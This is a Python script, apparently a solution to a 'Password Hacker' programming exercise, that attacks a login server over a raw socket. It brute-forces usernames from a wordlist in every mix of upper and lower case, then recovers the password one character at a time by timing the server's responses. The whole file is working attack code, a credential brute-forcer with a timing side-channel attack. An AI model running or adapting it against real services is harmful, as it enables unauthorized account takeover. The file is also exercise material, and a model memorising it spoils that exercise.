import sys
import socket
import string
import itertools
import json
import time

# constants
CONNECTION_SUCCESS = "Connection success!"
WRONG_PASSWORD = "Wrong password!"
WRONG_LOGIN = "Wrong login!"
EXCEPTION_LOGIN = "Exception happened during login"
LOGINS_FILE_PATH = 'C:\\Users\\profile1\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt'
PASSWORD_CHARACTERS = string.ascii_lowercase + string.ascii_uppercase + string.digits


# iterate character from available characters
def character_generator():
    for character in PASSWORD_CHARACTERS:
        yield character


# get login from txt file
def get_login(path_to_file):
    with open(path_to_file, 'r') as file:
        for line in file:
            # check each mixed capitalization of login
            for i in map(''.join, itertools.product(*zip(line.upper(), line.lower()))):
                # remove blank line
                yield i.strip('\n')


# get arguments
ip_address = sys.argv[1]
port = int(sys.argv[2])

# init placeholders
login_password = {"login": "", "password": ""}
password_list = list()

# establish connection
address = (ip_address, port)
with socket.socket() as socket:
    socket.connect(address)

    # check login
    generator = get_login(LOGINS_FILE_PATH)
    response = WRONG_LOGIN

    while response == WRONG_LOGIN:
        try:

            # generate login credential
            log_in = next(generator)
            login_password["login"] = log_in
            json_login = json.dumps(login_password).encode()

            # put request
            socket.send(json_login)

            # get response
            json_received = socket.recv(1024).decode()
            received = json.loads(json_received)
            response = received["result"]

            # check login credential success
            if response == WRONG_PASSWORD:
                break

        except StopIteration:
            break

    # check password
    response = WRONG_PASSWORD
    new_character_gen = character_generator()

    while response == WRONG_PASSWORD:
        try:

            # generate password credential
            new_character = next(new_character_gen)
            possible_password = "".join(password_list) + new_character
            login_password["password"] = possible_password
            json_login = json.dumps(login_password).encode()

            # record response time of caught exception
            start_request = time.time() * 1000

            # put request
            socket.send(json_login)

            # get response
            json_received = socket.recv(1024).decode()
            received = json.loads(json_received)

            # record response time
            end_request = time.time() * 1000
            request_time = end_request - start_request

            response = received["result"]

            # check if server caught exception
            if request_time > 10:
                password_list.append(new_character)
                # rest character generator
                new_character_gen = character_generator()
                # rest while loop condition
                response = WRONG_PASSWORD

            # check password credential success
            if response == CONNECTION_SUCCESS:
                break

        except StopIteration:
            break

print(json.dumps(login_password))

